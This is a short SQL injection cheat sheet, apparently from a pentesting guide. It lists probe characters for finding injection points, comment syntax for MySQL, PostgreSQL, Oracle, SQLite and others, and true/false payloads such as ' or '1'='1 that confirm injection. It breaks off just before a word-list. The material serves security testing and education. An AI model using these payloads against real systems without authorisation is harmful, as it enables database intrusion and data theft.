# Entry point detection
```
'
"
`
')
")
`)
'))
"))
`))
```
Then, you need to know how to fix the query so there isn't errors. In order to fix the query you can input data so the previous query accept the new data, or you can just input your data and add a comment symbol add the end
# Comments
```
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
# Confirming with logical operations
One of the best ways to confirm a SQL injection is by making it operate a logical operation and having the expected results.

For example: if the GET parameter ?username=Peter returns the same content as ?username=Peter' or '1'='1 then, you found a SQL injection.

Also you can apply this concept to mathematical operations. Example: If ?id=1 returns the same as ?id=2-1, SQLinjection.
```
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
This word-list was created to try to confirm SQLinjections in the proposed way:
